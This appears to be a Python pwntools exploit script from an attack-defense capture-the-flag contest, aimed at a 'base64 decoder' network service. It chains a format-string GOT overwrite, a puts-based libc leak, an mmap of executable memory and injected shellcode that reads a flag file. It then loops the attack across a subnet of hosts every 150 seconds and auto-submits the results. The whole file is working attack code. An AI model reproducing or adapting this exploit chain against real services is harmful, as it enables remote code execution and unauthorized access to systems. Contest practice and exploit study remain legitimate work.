#!/usr/bin/env python

from pwn import *
import sys, struct, time
import submit 

def exploit(ip):
    p = remote(str(ip), 20000)

    shellcode = shellcraft.sh() # get shell
    shellcode = shellcraft.linux.cat("/home/decoder/flag",1)  #cat file
    shellcode = asm(shellcode)

    #raw_input('start')

    puts_plt = 0x08048520
    printf_got = 0x0804B010
    puts_got = 0x0804B028
    read_plt = 0x080484B0
    memset_got = 0x0804B034

    main_addr = 0x08048B37
    start_addr = 0x080485A0


    sh = 0x08040000  #mprotect addr need 0xabcd0000

    ###############################################################
    p.recvuntil('THIS IS A SIMPLE BASE64 DECODER')
    test = '%{}x%7$hn'.format(str(0x8b31))
    payload = base64.b64encode(test)
    payload += p32(0x0)                 # to bypass check
    payload += p32(printf_got)

    payload += 'A'*20 #padding for add     esp, 40h
    payload += 'B'*8 #padding for pop 2

    payload += p32(puts_plt)
    payload += p32(main_addr)   # puts ret_addr: pop pop ret;  puts addr leak
    payload += p32(puts_got)
    payload += p32(sh)


    p.sendline(payload)

    buf = p.recvuntil('ODER')
    puts_addr = u32(buf[1:5])




    ##########ubuntu 16################
    system_addr = puts_addr - 0x24800
    open_addr = puts_addr + 0x74c70
    mprotect_addr = puts_addr + 0x81e70
    mmap_addr = puts_addr + 0x81d70

    ###########################


    ##########target  14################
    system_addr = puts_addr - 0x254d0
    open_addr = puts_addr + 0x77610
    mprotect_addr = puts_addr + 0x81c70
    mmap_addr = puts_addr + 0x81b40

    ###########################


    ##########target  libc################
    system_addr = puts_addr - 0x254d0
    open_addr = puts_addr + 0x77610
    mprotect_addr = puts_addr + 0x83f90
    mmap_addr = puts_addr + 0x83e60

    ###########################

    test = '%{}x%7$hn'.format(str(0x8b31))
    payload = base64.b64encode(test)
    payload += p32(0x0)
    payload += p32(printf_got)

    payload += 'A'*20 #padding for add     esp, 40h
    payload += 'B'*8 #padding for pop 2


    payload += p32(mmap_addr)
    payload += p32(main_addr)   # sh addr
    payload += p32(sh)
    payload += p32(1024)
    payload += p32(7)
    payload += p32(34)
    payload += p32(0)
    payload += p32(0)

    p.sendline(payload)

    ###############################################################


    p.recvuntil('THIS IS A SIMPLE BASE64 DECODER')
    test = '%{}x%7$hn'.format(str(0x8b31))
    payload = base64.b64encode(test)
    payload += p32(0x0)
    payload += p32(printf_got)

    payload += 'A'*20 #padding for add     esp, 40h
    payload += 'B'*8 #padding for pop 2

    payload += p32(read_plt)
    payload += p32(sh)   # read /bin/sh --> buf
    payload += p32(0)
    payload += p32(sh)
    payload += p32(100)

    p.sendline(payload)
    p.sendline(shellcode)
    ###############################################################

    p.recvline()  #padding
    ans = p.recvline()
    p.close()
    return ans


def do():
    for i in range (1,21):
        try:
            ans = exploit("172.16.1.%d"%(i))
            ans = ans.strip()
            print ans
            submit.submit(ans)
        except:
            continue



while True:
    do()
    time.sleep(150)




